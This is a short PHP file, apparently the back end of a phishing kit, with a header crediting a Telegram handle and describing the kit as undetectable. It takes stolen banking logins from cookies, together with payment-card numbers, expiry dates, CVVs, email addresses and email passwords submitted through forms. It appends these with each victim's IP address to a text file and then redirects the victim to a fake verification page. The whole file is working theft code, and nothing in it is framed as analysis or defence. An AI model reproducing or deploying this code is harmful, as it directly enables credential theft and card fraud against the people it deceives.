<?php
/**
###############################################
#$      https://telegram.me/neo_net          $#
#$          The Wine Juggler of FUD          $#
###############################################
**/

include '../../config/config.php';

if($_POST['content'] == 'main'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "".$_COOKIE['user']."|".$_COOKIE['pass']."|".$_POST['cc']."|".$_POST['month'].'/'.$_POST['year']."|".$_POST['cvv']."|".$ip."\n";;
$myfile = fopen("../SIEMPRE.txt", "a") or die("Unable to open file!");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
header('Location: ../../verify.php');

}

if($_POST['content'] == 'logo'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "".$_COOKIE['user']."|".$_COOKIE['pass']."|".$ip."\n";;
$myfile = fopen("../SIEMPRE.txt", "a") or die("Unable to open file!");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
}


if($_POST['content'] == 'correo'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "".$_COOKIE['user']."|".$_COOKIE['pass']."|".$_COOKIE['correo']."|".$_COOKIE['correopass']."|".$ip."\n";;
$myfile = fopen("../SIEMPRE.txt", "a") or die("Unable to open file!");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
}